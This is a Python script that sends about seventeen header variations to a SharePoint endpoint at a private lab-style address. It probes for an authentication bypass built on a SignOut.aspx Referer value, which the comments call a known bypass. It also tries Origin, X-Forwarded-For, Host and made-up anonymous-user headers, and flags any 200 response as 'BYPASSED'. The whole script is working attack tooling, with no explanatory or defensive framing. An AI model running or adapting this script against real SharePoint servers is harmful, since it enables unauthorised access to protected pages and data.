#!/usr/bin/env python3
# Purpose: Test alternative HTTP headers for authentication bypass
# Outcome: Check if other headers besides Referer can bypass authentication

import requests

target = "http://10.10.10.166"

# Test endpoint known to be vulnerable to SignOut Referer bypass
test_endpoint = "/_layouts/15/Picker.aspx"

# Alternative header variations to test
header_tests = [
    # Original working bypass
    {
        "name": "Baseline: SignOut Referer (known bypass)",
        "headers": {"Referer": "/_layouts/SignOut.aspx"}
    },
    
    # Alternative Referer values
    {
        "name": "SignOut Referer with query string",
        "headers": {"Referer": "/_layouts/SignOut.aspx?Source=/"}
    },
    {
        "name": "SignOut Referer with fragment",
        "headers": {"Referer": "/_layouts/SignOut.aspx#section"}
    },
    {
        "name": "Full URL SignOut Referer",
        "headers": {"Referer": "http://10.10.10.166/_layouts/SignOut.aspx"}
    },
    {
        "name": "SignOut Referer with path traversal",
        "headers": {"Referer": "/_layouts/../_layouts/SignOut.aspx"}
    },
    {
        "name": "Start.aspx Referer (public page)",
        "headers": {"Referer": "/_layouts/15/start.aspx"}
    },
    
    # Origin header variations
    {
        "name": "Origin header null",
        "headers": {"Origin": "null"}
    },
    {
        "name": "Origin header with SignOut path",
        "headers": {"Origin": "http://10.10.10.166/_layouts/SignOut.aspx"}
    },
    
    # X-Forwarded headers
    {
        "name": "X-Forwarded-For localhost",
        "headers": {"X-Forwarded-For": "127.0.0.1"}
    },
    {
        "name": "X-Forwarded-Host with SignOut",
        "headers": {"X-Forwarded-Host": "10.10.10.166/_layouts/SignOut.aspx"}
    },
    
    # Authentication-related headers
    {
        "name": "X-Anonymous-User true",
        "headers": {"X-Anonymous-User": "true"}
    },
    {
        "name": "X-SharePoint-Anonymous true",
        "headers": {"X-SharePoint-Anonymous": "true"}
    },
    {
        "name": "X-Authenticated false",
        "headers": {"X-Authenticated": "false"}
    },
    
    # Special authentication bypass headers from historical research
    {
        "name": "X-FORMS_BASED_AUTH_ACCEPTED (historical)",
        "headers": {"X-FORMS_BASED_AUTH_ACCEPTED": "true"}
    },
    {
        "name": "X-REWRITE-URL (historical)",
        "headers": {"X-REWRITE-URL": "/admin"}
    },
    
    # Host header variations
    {
        "name": "Host header with SignOut",
        "headers": {"Host": "10.10.10.166/_layouts/SignOut.aspx"}
    },
    
    # Combination: SignOut Referer + Other headers
    {
        "name": "SignOut Referer + X-Anonymous-User",
        "headers": {
            "Referer": "/_layouts/SignOut.aspx",
            "X-Anonymous-User": "true"
        }
    },
]

print("Testing Alternative HTTP Headers for Authentication Bypass")
print("="*80)
print(f"Test Endpoint: {test_endpoint}")
print("="*80)

for test in header_tests:
    url = f"{target}{test_endpoint}"
    
    try:
        response = requests.get(url, headers=test["headers"], allow_redirects=False, timeout=5)
        
        status = response.status_code
        if status == 401:
            result = "🔒 AUTH REQUIRED (401)"
        elif status == 403:
            result = "🔒 FORBIDDEN (403)"
        elif status == 200:
            result = "✅ BYPASSED (200)"
        elif status in [301, 302]:
            result = f"↪️  REDIRECT ({status})"
        elif status == 500:
            result = "⚠️  ERROR (500)"
        else:
            result = f"❓ {status}"
        
        print(f"\n{test['name']}:")
        print(f"  Headers: {test['headers']}")
        print(f"  Result: {result}")
        
    except Exception as e:
        print(f"\n{test['name']}:")
        print(f"  Headers: {test['headers']}")
        print(f"  Result: ❌ ERROR - {str(e)[:50]}")

print("\n" + "="*80)
